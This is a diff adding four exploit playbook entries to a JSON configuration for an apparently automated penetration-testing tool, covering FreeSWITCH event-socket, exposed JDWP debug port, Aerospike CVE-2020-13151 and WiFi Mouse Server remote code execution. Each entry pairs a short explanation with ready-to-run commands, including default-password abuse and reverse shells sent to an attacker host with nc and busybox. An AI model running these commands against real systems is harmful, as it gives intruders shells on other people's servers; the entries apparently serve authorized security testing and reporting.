@@ -1203,6 +1203,199 @@
           "note": "Set the correct target arch and VM profile; the wrong one BSODs the host instead of landing a shell."
         }
       ]
+    },
+    {
+      "id": "freeswitch-esl",
+      "title": "FreeSWITCH Event Socket Command Execution (EDB-47799)",
+      "hypothesis": "FreeSWITCH is a VoIP server, and its event socket on port 8021 ships with the default password ClueCon and, too often, no access-control list. Any client that authenticates with that password can run operating-system commands through the API, so the exposed socket is a direct shell. On Windows it runs as the service account, which is frequently high-privilege. Confirm the default password is accepted, then issue a system command.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "port:8021"
+      ],
+      "produces": [
+        "foothold.linux",
+        "foothold.windows"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution through the FreeSWITCH event socket when the default password is accepted",
+      "does_not_prove": "anything when the socket requires a changed password or enforces an ACL",
+      "report": {
+        "finding": "FreeSWITCH event socket exposed with the default ClueCon password",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/47799"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "printf 'auth ClueCon\\n\\napi status\\n\\n' | nc -nv {{target}} 8021",
+          "note": "A status reply means the default password is accepted and the socket is open to you."
+        },
+        {
+          "tool": "nc",
+          "run": "printf 'auth ClueCon\\n\\napi system whoami\\n\\n' | nc -nv {{target}} 8021",
+          "note": "The api system command runs an OS command; whoami confirms the execution context."
+        },
+        {
+          "tool": "python",
+          "run": "python3 47799.py {{target}} 'nc {{lhost}} 4444 -e /bin/sh'",
+          "note": "The PoC wraps auth and a reverse shell; start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "jdwp-debug",
+      "title": "JDWP Java Debug Port RCE",
+      "hypothesis": "The Java Debug Wire Protocol is meant for a developer to attach a debugger, and anyone who can reach the port can do the same, which includes invoking methods. That means code execution as the user running the JVM. The port is often bound to localhost, so you usually reach it through a pivot. Confirm it with the JDWP handshake, then a tool invokes a command inside the running Java process.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python",
+        "git"
+      ],
+      "os": [],
+      "phase": "access",
+      "requires_any": [
+        "port:8000",
+        "port:8787",
+        "port:5005"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "code execution in the JVM context through an exposed Java debug port",
+      "does_not_prove": "anything unless the port speaks JDWP and you can reach it, often only via a pivot",
+      "report": {
+        "finding": "Exposed JDWP debug port allows code execution in the JVM",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/IOActive/jdwp-shellifier"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "(printf 'JDWP-Handshake'; sleep 1) | nc -nv {{target}} 8000",
+          "note": "An echoed JDWP-Handshake confirms a live debug port."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/IOActive/jdwp-shellifier",
+          "note": "jdwp-shellifier injects a command into the running JVM; it needs python2."
+        },
+        {
+          "tool": "python",
+          "run": "python2 jdwp-shellifier.py -t {{target}} -p 8000 --cmd 'busybox nc {{lhost}} 4444 -e /bin/bash'",
+          "note": "Runs as the JVM user; if JDWP is bound to localhost, reach it through a chisel or ligolo pivot. Start nc -lvnp 4444 first."
+        }
+      ]
+    },
+    {
+      "id": "aerospike-udf",
+      "title": "Aerospike UDF Command Execution (CVE-2020-13151)",
+      "hypothesis": "Aerospike is a database, and versions up to 5.1.0.6 let an unauthenticated client register a user-defined Lua function that runs operating-system commands as the aerospike service user. The service listens on 3000 to 3003, and a web app often names Aerospike as its backend, which is how you spot it. Reach the port, run the public proof of concept to register the malicious UDF, and catch a shell.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python",
+        "git"
+      ],
+      "os": [
+        "linux"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:3000"
+      ],
+      "produces": [
+        "foothold.linux"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as the aerospike user via an attacker-registered Lua UDF",
+      "does_not_prove": "anything on Aerospike above 5.1.0.6, where the UDF path is restricted",
+      "report": {
+        "finding": "Aerospike unauthenticated Lua UDF command execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2020-13151",
+        "https://github.com/b4ny4n/CVE-2020-13151"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "nc -nv {{target}} 3000",
+          "note": "Aerospike speaks its info protocol on 3000 to 3003; a banner confirms the service."
+        },
+        {
+          "tool": "git",
+          "run": "git clone https://github.com/b4ny4n/CVE-2020-13151",
+          "note": "The PoC registers a Lua UDF that executes your command."
+        },
+        {
+          "tool": "python",
+          "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport 4444 --command rev",
+          "note": "Start nc -lvnp 4444 first; the UDF runs as the aerospike user."
+        }
+      ]
+    },
+    {
+      "id": "wifi-mouse-rce",
+      "title": "WiFi Mouse Server Unauthenticated RCE (EDB-50972)",
+      "hypothesis": "WiFi Mouse turns a phone into a mouse and keyboard for a PC, and its Mouse Server on port 1978 checks the client is authorised only on the client side, which an attacker simply skips. So file-execution events can be sent with no authentication and run a program as the logged-in desktop user. Confirm the port, then the public proof of concept drops and runs a reverse shell.",
+      "tool": "nc",
+      "tools": [
+        "nc",
+        "python"
+      ],
+      "os": [
+        "windows"
+      ],
+      "phase": "access",
+      "requires_any": [
+        "port:1978"
+      ],
+      "produces": [
+        "foothold.windows"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "command execution as the desktop user through the client-side-only Mouse Server auth",
+      "does_not_prove": "anything if the Mouse Server is not the vulnerable build or the port is closed",
+      "report": {
+        "finding": "WiFi Mouse Server client-side-only authentication allows unauthenticated RCE",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/exploits/50972"
+      ],
+      "commands": [
+        {
+          "tool": "nc",
+          "run": "nc -nv {{target}} 1978",
+          "note": "The Mouse Server control port answering confirms the target app is present."
+        },
+        {
+          "tool": "python",
+          "run": "python3 50972.py {{target}} {{lhost}} 4444",
+          "note": "The PoC sends unauthenticated file-exec events to run a reverse shell; start nc -lvnp 4444 first."
+        }
+      ]
     }
   ]
 }
